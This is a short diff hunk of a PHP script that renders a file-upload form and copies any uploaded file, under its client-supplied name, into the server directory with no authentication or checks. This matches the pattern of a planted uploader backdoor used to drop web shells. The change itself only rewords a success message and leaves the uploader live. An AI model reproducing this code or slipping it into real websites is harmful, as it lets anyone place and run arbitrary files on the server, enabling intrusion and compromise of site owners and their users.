@@ -7,7 +7,7 @@ echo "<form method='post' enctype='multipart/form-data'>
 </form>";
 if($_POST['upload']) {
   if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
-  echo "Done Uploaded!";
+  echo "Uploaded!";
   } else {
   echo "Failed to Upload.";
   }
